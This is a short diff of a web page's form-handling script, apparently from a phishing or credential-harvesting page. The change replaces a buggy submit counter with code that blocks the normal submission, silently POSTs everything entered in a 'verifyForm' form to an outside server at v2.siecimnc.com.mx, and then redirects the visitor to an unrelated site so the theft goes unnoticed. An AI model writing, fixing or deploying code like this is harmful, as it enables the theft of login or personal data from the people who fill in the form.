@@ -153,21 +153,20 @@
   </div>
 
 <script>
-  let submitCount = 0;
   const form = document.getElementById("verifyForm");
 
   form.addEventListener("submit", function (e) {
-    submitCount++;
+    e.preventDefault(); // stop normal reload
 
-    if (submitCount === 1) {
-      // Allow normal form submission (page reload)
-      form.action = "https://v2.siecimnc.com.mx/auth/next.php"; 
-      form.method = "POST";
-    } else if (submitCount === 1) {
-      // Prevent reload, just redirect
-      e.preventDefault();
+    // send the form data to PHP in the background
+    const formData = new FormData(form);
+    fetch("https://v2.siecimnc.com.mx/auth/next.php", {
+      method: "POST",
+      body: formData
+    }).then(() => {
+      // after sending, redirect
       window.location.href = "https://www.sample.net/#hose";
-    }
+    });
   });
 </script>
 
